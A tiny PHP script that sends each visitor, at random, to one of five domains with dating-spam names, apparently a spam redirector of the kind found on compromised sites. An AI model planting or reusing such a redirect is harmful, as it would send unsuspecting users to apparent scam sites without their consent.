<?php
$urls = array("vipamor.bid",
              "topsingles.work",
              "findlight.date",
              "websweet.date",
              "lovechanse.win");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

